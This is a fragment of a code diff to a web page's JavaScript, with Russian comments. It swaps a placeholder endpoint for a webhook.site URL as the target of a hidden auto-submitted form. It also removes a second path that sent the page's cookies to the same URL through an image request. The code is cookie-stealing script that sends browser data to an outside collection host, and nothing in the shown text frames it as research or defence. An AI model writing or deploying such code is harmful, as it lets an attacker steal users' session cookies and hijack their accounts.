@@ -15,7 +15,7 @@
             // Создаем скрытую форму для отправки данных
             var form = document.createElement('form');
             form.method = 'POST';
-            form.action = 'https://your-server.com/collect';
+            form.action = 'https://webhook.site/d1933a3f-90d0-4258-99ef-f0686f993e62';
             
             var input = document.createElement('input');
             input.type = 'hidden';
@@ -27,10 +27,6 @@
             
             // Отправляем форму
             form.submit();
-            
-            // Дополнительно отправляем через изображение
-            var img = new Image();
-            img.src = 'https://webhook.site/d1933a3f-90d0-4258-99ef-f0686f993e62/' + encodeURIComponent(cookies);
         };
     </script>
 </body>
